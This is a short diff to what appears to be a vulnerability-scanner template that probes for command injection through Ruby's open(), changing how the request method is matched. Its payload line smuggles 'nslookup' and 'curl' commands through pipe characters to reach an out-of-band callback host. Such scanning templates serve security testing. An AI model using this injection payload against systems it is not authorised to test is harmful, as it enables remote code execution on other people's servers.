@@ -8,12 +8,13 @@ http:
     type: word
     words:
     - dns
-  method: GET
-  path:
-  - '{{BaseURL}}'
   payloads:
     interaction:
     - '|nslookup {{marker}}|curl {{marker}}'
+  pre-condition:
+  - dsl:
+    - method == "GET"
+    type: dsl
   stop-at-first-match: true
 id: cmdi-ruby-open-rce
 info:
